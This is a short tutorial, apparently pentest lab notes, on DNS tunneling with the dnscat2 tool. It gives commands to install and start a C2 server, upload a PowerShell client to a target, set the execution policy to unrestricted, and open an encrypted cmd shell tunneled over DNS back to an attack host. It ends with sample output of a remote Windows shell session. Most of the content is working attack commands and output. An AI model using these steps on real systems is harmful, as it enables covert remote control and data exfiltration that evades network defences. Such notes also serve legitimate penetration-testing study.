DNS Tunneling with Dnscat2
##########################

Description
***********

Dnscat2 is a tool to leverage the TXT record to transfer data between to machines.  It leverages an encrypted C&C (or C2) 
chanel.  

Installation
************
.. code-block:: console

    git clone https://github.com/iagox86/dnscat2.git

    cd dnscat2/server/
    sudo gem install bundler
    sudo bundle install

Usage
*****

**step 1** 

Starting the dnscat2 server

.. code-block:: console

    sudo ruby dnscat2.rb --dns host=10.10.15.24,port=53,domain=inlanefreight.local --no-cache

The output of this command will yield a secret key that is to be used on the client

**step 2**
To use the Windows client clone the following repository

.. code-block:: console

    git clone https://github.com/lukebaggett/dnscat2-powershell.git

Upload the .ps1 file to the target.


**Step 3** Change the security policy and Load the file into the cmdlet

.. code-block:: console

    Set-ExecutionPolicy -ExecutionPolicy unrestricted -Scope Process
    Import-Module ./dnscat2.ps1

**Step 4** establish a tunnel back to the attack host

.. code-block:: console

    Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 37268a1c8f891abc814e1a75db083cac -Exec cmd

You can interact with the tunnel by looking at options with `?`

**Step 5**

Interacting with the tunnel

.. code-block:: console 

    dnscat2> window -i 1
    New window created: 1
    history_size (session) => 1000
    Session 1 Security: ENCRYPTED AND VERIFIED!
    (the security depends on the strength of your pre-shared secret!)
    This is a console session!

    That means that anything you type will be sent as-is to the
    client, and anything they type will be displayed as-is on the
    screen! If the client is executing a command and you don't
    see a prompt, try typing 'pwd' or something!

    To go back, type ctrl-z.

    Microsoft Windows [Version 10.0.18363.1801]
    (c) 2019 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>
    exec (OFFICEMANAGER) 1>